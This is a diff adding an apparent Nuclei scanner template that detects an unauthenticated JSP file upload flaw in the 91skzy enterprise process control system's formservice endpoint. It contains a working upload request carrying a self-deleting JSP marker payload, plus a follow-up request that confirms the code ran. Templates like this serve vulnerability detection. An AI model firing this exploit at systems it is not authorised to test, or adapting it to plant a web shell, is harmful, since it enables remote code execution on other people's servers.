@@ -1,0 +1,52 @@
+id: 91skzy-formservice-file-upload
+info:
+  name: 91skzy Formservice File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Spatiotemporal Zhiyou enterprise process control system formservice file upload vulnerability, attackers can use the vulnerability to obtain system permissions.
+  reference:
+    - http://www.91skzy.net
+  classification:
+    cvss-score: 9.0
+  tags: file-upload
+
+variables:
+  random_hex: "{{rand_base(16)}}"
+  payload_content: "<% out.println('{{random_hex}}');new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>"
+
+http:
+  - raw:
+      - |
+        POST /formservice?service=attachment.write&isattach=false&filename={{random_hex}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+
+        {{payload_content}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ".jsp</root>"
+    extractors:
+      - type: regex
+        internal: true
+        group: 0
+        regex:
+          - "20.*?jsp"
+
+  - raw:
+      - |
+        GET /form/temp/{{random_hex}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{random_hex}}"
+      - type: status
+        status:
+          - 200
